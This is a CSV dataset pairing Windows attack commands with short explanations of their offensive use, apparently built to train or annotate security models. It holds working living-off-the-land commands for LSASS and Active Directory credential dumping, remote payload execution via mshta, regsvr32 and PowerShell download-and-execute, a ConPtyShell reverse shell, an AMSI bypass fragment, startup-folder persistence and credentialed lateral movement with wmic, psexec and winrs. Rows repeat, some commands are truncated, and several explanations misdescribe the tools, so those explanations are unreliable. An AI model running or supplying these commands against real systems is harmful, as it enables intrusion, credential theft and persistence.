prompt,response
"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""","This command can be used to dump the memory of the Local Security Authority Subsystem Service (LSASS) process, which contains sensitive information such as passwords, and can be used for further analysis or exploitation."
rundll32.exe ieadvpack.dll,This command can be used to execute arbitrary code and potentially download and install malware on a Windows machine.
rundll32.exe ieadvpack.dll,This command can be used to execute arbitrary code and potentially download and install malware on a Windows machine.
rundll32.exe ieframe.dll,This command can be used to launch Internet Explorer and potentially execute malicious code or download additional malware onto the system.
rundll32.exe Mshtml.dll,"Potential use: Execute malicious code through a legitimate Windows process.
What it does: Loads the Mshtml.dll library and executes any exported function within it."
rundll32.exe pcwutl.dll,"This command is used to launch the Performance Monitor Wizard, which could potentially be used to gather system performance data for reconnaissance purposes in a cyberattack."
rundll32.exe setupapi.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Runs a function in setupapi.dll, which is used for installing device drivers and other system components."
rundll32.exe setupapi.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Runs a function in setupapi.dll, which is used for installing device drivers and other system components."
rundll32.exe shdocvw.dll,This command can be used to execute arbitrary code and potentially download and execute additional malware on a Windows machine.
rundll32.exe shell32.dll,"Potential use: Execute shell commands from DLL files.
What it does: Loads the shell32.dll file and executes the specified command."
rundll32.exe syssetup.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Launches the System Setup process, which can be used to install or uninstall Windows components and drivers."
rundll32 syssetup.dll,"Potential use: Execute code from a DLL file.
What it does: Launches the Windows Setup API, which can be used to install or uninstall Windows components and updates."
rundll32.exe url.dll,"Can be used to launch a URL or execute a DLL file, potentially used to download and execute malicious code."
rundll32.exe zipfldr.dll,"Potential use: Compress or extract files.
What it does: Opens the built-in Windows zip folder interface."
adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet,"This command can be used to capture a memory dump of the Local Security Authority Subsystem Service (LSASS) process, which contains sensitive information such as passwords, and save it to a specified output folder for later analysis."
"AgentExecutor.exe -powershell ""c:\\temp\\malicious.ps1"" ""c:\\temp\\test.log"" ""c:\\temp\\test1.log"" ""c:\\temp\\test2.log"" 60000 ""C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0"" 0 1","This command can be used to execute a PowerShell script (malicious.ps1) with arguments and log the output to specified files, potentially allowing an attacker to execute arbitrary code and maintain persistence on a Windows machine."
AppVLP.exe \\\\webdav\\calc.bat,"This command can be used to execute a batch file hosted on a remote server, potentially allowing an attacker to run malicious code on a victim's machine."
AppVLP.exe \\\\10.10.10.10\\calc.bat,"This command can be used to execute a batch file containing malicious code on a remote machine, potentially allowing an attacker to gain access or control over the machine."
bginfo.exe bginfo.bgi /popup /nolicprompt,"Displays system information on the desktop background, potentially useful for reconnaissance and information gathering during a cyberattack."
bginfo.exe bginfo.bgi /popup /nolicprompt,"Displays system information on the desktop background, potentially useful for reconnaissance and information gathering during a cyberattack."
cdb.exe -cf x64_calc.wds -o notepad.exe,"This command can be used to create a malicious payload by converting a Windows Debugger Script (WDS) file containing shellcode into an executable file (notepad.exe) using the Crash Dump Builder (cdb.exe) tool, which can then be used to execute arbitrary code on a target machine."
coregon.exe.exe /L C:\\folder\\evil.dll dummy_assembly_name,This command can be used to execute a malicious DLL file (evil.dll) under the guise of a legitimate process (dummy_assembly_name) in order to evade detection and perform malicious actions on the compromised Windows machine.
coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name,"This command can be used to generate a malicious DLL file and load it into memory, potentially allowing an attacker to execute arbitrary code on the compromised system."
csi.exe file,"Potential use in a cyberattack: It can be used to analyze and collect forensic data from a Windows machine.
What it might do on a Windows machine: It will launch the Windows forensic tool, Computer System Investigation (CSI), which can collect information about running processes, network connections, and system configuration."
"DefaultPack.EXE /C:""process.exe args""",This command can be used to execute a process with arguments and can be used in a living off the land attack to run malicious code or execute a payload on a Windows machine.
"devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] ""argument here"" test",This command can be used to launch a binary for deployment and testing purposes.
dnx.exe consoleapp,"Potential use in a cyberattack: Running a console application to execute malicious code or commands.
What it might do on a Windows machine: Launches the .NET Execution Environment (DNX) to run a console application on a Windows machine."
dotnet.exe [PATH_TO_DLL],Execute a .NET assembly and potentially load a malicious DLL for code execution or persistence.
dotnet.exe [PATH_TO_DLL],Execute a .NET assembly and potentially load a malicious DLL for code execution or persistence.
Dxcap.exe -c C:\\Windows\\System32\\notepad.exe,"This command captures network traffic and saves it to a file, while also launching Notepad. 

Potential use in a cyberattack: Capture sensitive information being transmitted over the network while also distracting the user with a harmless Notepad window."
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll,"Potential use: Download and execute a malicious DLL from a remote server using a trusted application.

What it does: Executes Microsoft Excel and loads a Teams add-in DLL from a remote server, which could potentially contain malicious code."
Mftrace.exe cmd.exe,This command can be used to execute arbitrary commands through cmd.exe and potentially bypass security measures.
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""","This command can be used to execute a batch file containing malicious code on a target machine, potentially allowing an attacker to gain remote access or execute further commands."
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""","This command can be used to execute a batch file containing malicious code on a target machine, potentially allowing an attacker to gain remote access or execute further commands."
msxsl.exe customers.xml script.xsl,"This command can be used to execute an XSL script on an XML file, potentially allowing an attacker to extract sensitive information from the XML file or modify its contents."
msxsl.exe customers.xml script.xsl,"This command can be used to execute an XSL script on an XML file, potentially allowing an attacker to extract sensitive information from the XML file or modify its contents."
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\\"" q q","This command can be used to create a full copy of the Active Directory database on a Windows machine, which can be used for offline analysis or to extract sensitive information such as user credentials."
"Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""","This command could potentially download and execute a malicious DLL file from a remote server, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine."
"Powerpnt.exe ""http://193.168.1.10/TeamsAddinLoader.dll""","Potential use: Download and execute a malicious DLL from a remote server disguised as a legitimate Teams add-in loader.

What it does: Executes PowerPoint and attempts to download and load the DLL from the specified URL, potentially giving the attacker remote access to the compromised machine."
"Powerpnt.exe ""http://amaare.mere/TeamsAddinLoader.dll""","This command could potentially download and execute a malicious DLL file from a remote server, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine."
rcsi.exe bypass.csx,This command may be used to execute a C# script that could potentially bypass security measures on a Windows machine.
rcsi.exe bypass.csx,This command may be used to execute a C# script that could potentially bypass security measures on a Windows machine.
"Remote.exe /s ""powershell.exe"" anythinghere","This command can be used to execute PowerShell commands remotely on a Windows machine, potentially allowing an attacker to execute malicious code or commands without being physically present on the machine."
"Remote.exe /s ""powershell.exe"" anythinghere","This command can be used to execute PowerShell commands remotely on a Windows machine, potentially allowing an attacker to execute malicious code or commands without being physically present on the machine."
sqldumper.exe 464 0 0x0110,"Potential use: Dumping memory of a running SQL Server process for further analysis.
What it does: Executes the SQL Server process with the specified process ID and generates a memory dump file for analysis."
Sqlps.exe -noprofile,"Potential use: Execute SQL commands without leaving traces in the PowerShell history.

What it does: Launches the SQL Server PowerShell module without loading the user's PowerShell profile."
SQLToolsPS.exe -noprofile -command Start-Process calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through SQLToolsPS.exe, potentially allowing an attacker to bypass security measures and run arbitrary code on the target machine."
squirrel.exe --download [http://10.10.10.1],"Potential use: Downloading a file from a remote server.
What it does: Downloads a file from the specified URL using the Squirrel framework."
squirrel.exe --download [http://11.1.1.1],"Potential use: Downloading a file from a remote server.
What it does: Downloads a file from the specified URL using the Squirrel installer framework."
squirrel.exe --download [http://nice.domain],This command can be used to download a file from a specified URL and potentially execute it on the Windows machine.
squirrel.exe --update [http://10.10.10.1],"This command updates the Squirrel framework from a specified URL, which could potentially be used to download and execute malicious code on a Windows machine."
squirrel.exe --update [http://11.1.1.1],This command updates the Squirrel framework and could potentially be used to download and execute malicious code from a remote server.
squirrel.exe --update [http://nice.domain],"Potential use: Download and execute malicious code from a remote server.
What it does: Updates the Squirrel framework with the specified URL."
te.exe bypass.wsc,This command can be used to execute a scriptlet file (.wsc) that can potentially bypass security measures and execute malicious code on a Windows machine.
Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe,"This command can be used to inject malicious code into a legitimate process (write.exe) by loading a malicious DLL (calc.dll) into its memory space, allowing an attacker to execute arbitrary code on the compromised machine."
Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe,"This command can be used to inject malicious code into a legitimate process (write.exe) by loading a malicious DLL (calc.dll) into its memory space, allowing an attacker to execute arbitrary code on the compromised machine."
Update.exe --download [http:/nice.domain],"Potential use: Downloading malicious code from a remote server.
What it does: Initiates a download of a file from the specified URL using the Windows Update service."
Update.exe --download [http://11.10.10.1],"Potential use: Downloading malicious code from a remote server.
What it does: Initiates a download of a file from the specified URL using the Windows Update executable."
Update.exe --download [http://10.10.10.1],This command can be used to download a file from a remote server and potentially update a program or install malware on the Windows machine.
Update.exe --update=[http://10.10.10.1],"This command could potentially be used to download and execute a malicious payload from a remote server specified in the URL, allowing an attacker to gain unauthorized access or control of the compromised Windows machine."
Update.exe --update=[http://11.10.10.1],"This command could potentially be used to download and execute a malicious payload from a remote server specified in the URL, allowing an attacker to gain unauthorized access or control of the compromised Windows machine."
Update.exe --update=[http:/nice.domain],"Potential use: Download and execute malicious code from a remote server.

What it does: Runs the Windows Update executable with a specified update URL, which could be a malicious server hosting malware."
Vsjitdebugger.exe calc.exe,"This command can be used to launch the Windows calculator (calc.exe) as a child process of the Visual Studio Just-In-Time Debugger (vsjitdebugger.exe), potentially allowing an attacker to execute arbitrary code or commands on the compromised machine."
"winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",This command could potentially be used to download and execute a malicious DLL file from a remote server using Microsoft Word as a living off the land technique on a Windows machine.
wsl.exe -e /mnt/c/Windows/System32/calc.exe,"This command can be used to execute the Windows Calculator application from within the Windows Subsystem for Linux (WSL) environment, potentially allowing an attacker to bypass security measures and run malicious code on a compromised machine."
wsl.exe --exec bash -c \'cat < /dev/tcp/192.168.1.10/54 > binary\',This command can be used to download a binary from a remote machine and save it locally on a Windows machine using the Windows Subsystem for Linux (WSL).
. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1,This command runs a PowerShell script that verifies the version of the AERO mutex and then runs another PowerShell script named calc.ps1 after canceling any previous instances of it. It could potentially be used in a living off the land attack to execute malicious PowerShell scripts and evade detection.
. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke <executable> [args],"This command can be used to execute an arbitrary executable with arguments, potentially allowing an attacker to run malicious code on the system."
set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf,"This command sets the command prompt to open the calculator and then runs a Windows script to manage BitLocker Drive Encryption, potentially allowing an attacker to bypass encryption and access sensitive data."
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code."
pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code."
pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code."
reg.exe import c:\\path\\to\\Slmgr.reg & cscript.exe /b c:\\windows\\system32\\slmgr.vbs,"This command imports a registry file and then runs a VBScript to manage Windows activation, potentially allowing an attacker to activate a stolen or pirated copy of Windows on a compromised machine."
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""","This command can be used to download and execute a PowerShell script from a remote server, potentially allowing an attacker to gain unauthorized access or execute malicious code on the compromised machine."
"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985","This command can be used to remotely create a process (in this case, notepad.exe) on a target machine using Windows Remote Management (WinRM)."
%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,"This command can be used to bypass Windows Defender and execute malicious code through Windows Remote Management (WinRM) by retrieving the process handle of a legitimate process (in this case, Handle 4) and injecting malicious code into it."
"Pester.bat [/help|?|-?|/?] ""$null; notepad""","This command can be used to execute a PowerShell script that can be used to download and execute malicious code, while also opening a decoy notepad window to avoid suspicion."
"C:\Python27\python.exe -c ""(lambda __y",This is an incomplete command and cannot be used for any purpose.
"C:\Python27\python.exe -c ""(lambda __y",This command executes a Python script and could potentially be used to run malicious Python code on a Windows machine.
"ruby -rsocket -e 'c=TCPSocket.new(""10.0.0.1""","This command opens a TCP socket to IP address 10.0.0.1 using the Ruby programming language, which could potentially be used to establish a remote connection to a target machine for further exploitation or data exfiltration."
"ruby -rsocket -e 'c=TCPSocket.new(""11.0.0.1""","This command opens a TCP socket to IP address 11.0.0.1 using the Ruby programming language, which could potentially be used to establish a remote connection to a command and control server for data exfiltration or further exploitation."
lua5.1 -e 'local host,"This command executes a Lua script on the machine, which could potentially be used to run malicious code or commands."
lua5.1 -e 'local host,"This command executes a Lua script on the machine, which could potentially be used to run malicious code or commands."
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001,"This command downloads and executes a PowerShell script from a remote GitHub repository, which establishes a reverse shell to a specified IP address and port. It can be used by an attacker to gain remote access to a compromised Windows machine."
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 11.0.0.2 3001,"This command downloads and executes a PowerShell script from a GitHub repository, which establishes a reverse shell to a specified IP address and port. It can be used for remote access and control of a compromised Windows machine."
psexec \\test.domain -u Domain\User -p Password ipconfig,"This command can be used to remotely execute ipconfig on a target machine using psexec, which can be useful for gathering network information during a cyberattack."
psexec \\10.10.10.10 -u Domain\User -p Password ipconfig,"This command can be used to remotely execute ipconfig on a target machine using psexec, which can be useful for gathering network information during a cyberattack."
sc \\host.domain create ExampleService binpath= “c:\windows\system32\calc.exe”,"This command can be used to create a new service on a remote machine and set its binary path to execute a malicious program (in this case, the calculator)."
sc \\10.10.10.10 create ExampleService binpath= “c:\windows\system32\calc.exe”,This command can be used to create a new service on a remote machine and set its binary path to execute a malicious executable such as a backdoor or a keylogger.
sc \\10.10.10.10 start ExampleService,"This command can be used to start a service named ExampleService on a remote machine with IP address 10.10.10.10, which can be useful for executing malicious code or maintaining persistence on a compromised machine."
sc \\host.domain start ExampleService,"Potential use in a cyberattack: Starting a service on a remote machine to establish persistence or execute malicious code.
What it might do on a Windows machine: Starts the ExampleService on the remote machine specified by the host.domain parameter."
"wmic /node:target.domain /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exe”","This command can be used to remotely execute the Windows calculator on a target machine using the Windows Management Instrumentation Command-line (WMIC) tool, which can be useful for lateral movement and privilege escalation."
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exe”",This command can be used to remotely execute the Windows calculator application on a specified machine using valid credentials. It can be used in a cyberattack to test for successful lateral movement and privilege escalation.
winrs -r:EXAMPLE.lab.local -u:DOMAIN\user -p:password calc.exe,"This command can be used to remotely execute the Windows calculator on a machine in the EXAMPLE.lab.local domain using the specified user credentials, potentially allowing an attacker to gain access to sensitive information or execute further commands on the compromised machine."
winrs -r:10.10.10.10 -u:DOMAIN\user -p:password calc.exe,"This command can be used to remotely execute the Windows calculator on a machine with IP address 10.10.10.10 using the specified user credentials, which could potentially be used in a cyberattack for lateral movement or privilege escalation."
schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System,"This command can be used to create a scheduled task that runs the calculator program once at midnight using the System account, which can be used to execute malicious code or commands on a compromised machine."
schtasks /run /tn ExampleTask /S host.domain,"This command can be used to execute a scheduled task remotely on a Windows machine, which can be useful for executing malicious code or commands on a compromised system."
schtasks /run /tn ExampleTask /S 10.10.10.10,"This command can be used to remotely execute a scheduled task on a Windows machine with IP address 10.10.10.10, which could potentially be used in a cyberattack for persistence or to execute malicious code on the target machine."
schtasks /F /delete /tn ExampleTask /S host.domain,"This command can be used to delete a scheduled task remotely on a Windows machine, which can be useful for removing persistence mechanisms or disabling automated tasks set up by an attacker."
schtasks /F /delete /tn ExampleTask /S 10.10.10.10,"This command can be used to delete a scheduled task remotely on a Windows machine, potentially to remove a persistence mechanism or disable a scheduled malware execution."
MSBuild.exe \\host.domain\path\to\XMLfile.xml,"This command can be used to execute an XML file containing MSBuild instructions, which can be used to build and compile code, potentially allowing an attacker to execute malicious code on the target machine."
MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml,"This command can be used to execute an XML file as a build script, which can be abused to execute arbitrary code or commands on a target machine."
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml,"This command can be used to execute an XML file on a remote host, potentially allowing an attacker to execute arbitrary code on the target machine."
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml,"This command can be used to execute an XML file remotely, potentially allowing an attacker to execute malicious code on the target machine."
"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a Windows machine using the Windows Management Instrumentation Command-line (WMIC) tool."
"wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a target machine using the Windows Management Instrumentation Command-line (WMIC) tool."
copy C:\Users\Administrator\Downloads\build.xml \\10.10.10.10\C$\Windows\Temp\,"This command can be used to copy a file from the local machine to a remote machine, potentially allowing an attacker to move malicious files onto a target machine for execution."
"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, a build.xml file) on a Windows machine using the Windows Management Instrumentation Command-line (WMIC) tool."
"wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml""","This command can be used to remotely execute a malicious payload (in this case, Msbuild.exe) on a target machine (10.10.10.10) using stolen credentials (LAB\Administrator) and create a new process (build.xml) in a temporary directory."
"psexec \\host.domain -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\host.domain\C$\Windows\Temp\build.xml""","This command can be used to remotely execute Msbuild.exe on a target machine, potentially allowing an attacker to build and execute malicious code on the target machine."
"psexec \\10.10.10.10 -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml""","This command can be used to remotely execute Msbuild.exe on a target machine, potentially allowing an attacker to build and execute malicious code on the target machine."
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""","This command can be used to launch the Microsoft Management Console (MMC) on a Windows machine, which can be used to manage various aspects of the system, including services, event logs, and certificates. In a cyberattack, this command could be used to gain access to sensitive information or to modify system settings."
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""","This command can be used to launch the Microsoft Management Console (MMC) on a Windows machine, which can be used to manage various system settings and configurations, and could potentially be used by an attacker to gain further access or control over the system."
copy C:\Windows\Temp\Malice.exe \\10.10.10.10\C$\Windows\Temp,"This command can be used to copy a malicious executable file to a remote machine's temporary folder, allowing for remote execution of the malware."
"wmic /node:target.domain /user:domain\user /password:password process call create ""C:\Windows\Temp\Malice.exe”",This command can be used to remotely execute a malicious executable file on a target machine using valid credentials.
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\Temp\Malice.exe”",This command can be used to remotely execute a malicious executable file on a target machine using Windows Management Instrumentation Command-line (WMIC) and can be used for lateral movement or to establish persistence on the target machine.
mshta.exe http://malicious.domain/runme.hta,"This command can be used to execute a malicious HTA file from a remote server, potentially allowing an attacker to download and execute additional malware on the compromised system."
mshta.exe http://11.10.10.10/runme.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, potentially allowing an attacker to download and execute additional malware on the victim's machine."
mshta.exe http://10.10.10.10/runme.hta,"This command can be used to execute a malicious HTA file hosted on a remote server, allowing an attacker to run arbitrary code on the victim's machine."
"rundll32.exe javascript:""..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.
"rundll32.exe javascript:""..\mshtml",This command can be used to execute arbitrary JavaScript code and potentially download and execute additional malware on a Windows machine.
rundll32.exe url.dll,"Can be used to launch a URL or execute a DLL file, potentially used to download and execute malicious code."
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and load it into the scrobj.dll library, potentially allowing an attacker to gain remote access to the system."
regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and register a DLL file, potentially allowing for persistence and remote access to the compromised machine."
regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll,"This command can be used to execute a malicious script hosted on a remote server and register a DLL file, potentially allowing an attacker to gain persistence on the compromised system and execute further malicious actions."
powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',"This command can be used to check if the Anti-Malware Scan Interface (AMSI) is disabled on a Windows machine, which can be useful for bypassing antivirus detection during a cyberattack."
"powershell [Delegate]::CreateDelegate((""Func``3[String","This command can be used to create a delegate function in PowerShell, which can be used to execute arbitrary code and potentially bypass security measures on a Windows machine."
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1'),"This command downloads and executes a PowerShell script from a remote server, which could be used to perform various actions on the compromised machine or network."
powershell IEX (New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.obs.ps1'),"This command downloads and executes a PowerShell script from a remote server, which could be used to perform various actions on the compromised machine, such as reconnaissance, privilege escalation, or lateral movement."
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET',"This command can be used to send a GET request to a web server and retrieve data, which can be used to exfiltrate sensitive information from a compromised machine."
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET',"This command can be used to send a GET request to a web server and retrieve data, which can be used to exfiltrate sensitive information from a compromised machine."
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the target machine."
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://193.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the victim machine."
"powershell Invoke-WebRequest ""http://10.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe""","This command downloads a file from a remote server and saves it to the Windows startup folder, potentially allowing for persistence and remote access to the compromised machine."
"powershell Invoke-WebRequest ""http://11.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe""","This command downloads a file from a remote server and saves it to the Windows startup folder, allowing it to execute every time the machine is restarted, potentially allowing for persistent access and control of the machine."
powershell $bytes = [System.Text.Encoding]::Unicode.GetBytes($command),"This command encodes a given command in Unicode format and stores it in a variable called $bytes, which could potentially be used to execute malicious code or commands on a Windows machine using PowerShell."
powershell $encodedCommand = [Convert]::ToBase64String($bytes),"This command can be used to encode a PowerShell script into base64 format, which can then be executed on a Windows machine without being detected by antivirus software."
powershell Get-DomainUser | select -ExpandProperty cn,"Potential use: Enumeration of domain users.
What it does: Retrieves the common name (cn) property of all domain users."
powershell Get-DomainUser | select -ExpandProperty cn,"Potential use: Enumeration of domain users.
What it does: Retrieves the common name (cn) property of all domain users."
powershell Get-DomainComputer,"Potential use: Enumeration of domain computers.
What it does: Retrieves a list of all computers in the current domain."
powershell Get-ForestDomain,"Potential use in a cyberattack: Gathering information about the target network's forest domain.

What it might do on a Windows machine: Retrieves information about the forest domain in Active Directory, including the domain name, domain controllers, and trusts."
powershell Get-DomainTrust,"Potential use: Enumeration of trusted domains in a network for lateral movement.

What it does: Retrieves information about trusts established between the current domain and other domains in the forest."
powershell Get-ForestTrust,"Potential use in a cyberattack: Gathering information about trusted domains in a forest for lateral movement.

What it might do on a Windows machine: Retrieves information about forest trusts, including the trusted domain name, direction of trust, and trust type."
"powershell Get-DomainGroup ""Domain Admins""","Potential use: Enumeration of privileged accounts.
What it does: Retrieves the members of the ""Domain Admins"" group in the current domain using PowerShell."
"powershell Get-DomainGroupMember ""Domain Admins"" | select -ExpandProperty membername","This command can be used to enumerate all members of the ""Domain Admins"" group in a Windows domain, which can be useful for lateral movement and privilege escalation in a cyberattack."
powershell Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC,This command can be used to find network shares on a Windows machine and can be used in a cyberattack to identify potential targets for lateral movement or data exfiltration.
powershell Get-DomainOU -FullData,"Potential use: Reconnaissance.

What it does: Retrieves detailed information about all Organizational Units (OUs) in a domain, including their names, descriptions, distinguished names, and security descriptors."
powershell Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname,This command can be used to enumerate all the domain-joined servers in an Active Directory environment and retrieve their hostnames. It can be used for reconnaissance purposes in a cyberattack.
powershell Get-DomainOU *WS* | select gplink,"This command can be used to enumerate all Organizational Units (OUs) in a domain that contain ""WS"" in their name and retrieve the Group Policy Links (GPLink) associated with them. This information can be used to identify potential targets for lateral movement or privilege escalation."
"powershell Get-DomainGPO -Name ""{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}""","Potential use: Enumeration of Group Policy Objects (GPOs) for lateral movement and privilege escalation.

What it does: Retrieves the specified GPO by name from the domain and displays its properties."
powershell Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName,This command can be used to enumerate the members of a local group in a Group Policy Object (GPO) and can be used in a cyberattack to gather information about the target machine's local group membership.
"powershell Get-DomainObjectAcl -SearchBase ""CN=Policies","This command can be used to retrieve the access control list (ACL) of a domain object in Active Directory, which can be useful for identifying potential vulnerabilities or weaknesses in the system."
"powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq ""GP-Link"" -and $_.ActiveDirectoryRights -match ""WriteProperty"" } | select ObjectDN","This command can be used to find Group Policy Objects (GPOs) that have write permissions, which can be abused to modify GPOs and potentially execute code or escalate privileges on a Windows machine."
"powershell Get-DomainObjectAcl -SamAccountName ""Domain Admins"" -ResolveGUIDs | Select IdentityReference","This command can be used to retrieve the access control list (ACL) of the ""Domain Admins"" group and potentially identify privileged accounts in a Windows domain environment."
powershell Find-InterestingDomainAcl | select identityreferencename,"Potential use: Enumeration of domain permissions and users.
What it does: Uses PowerShell to search for interesting domain ACLs and selects the identity reference name."
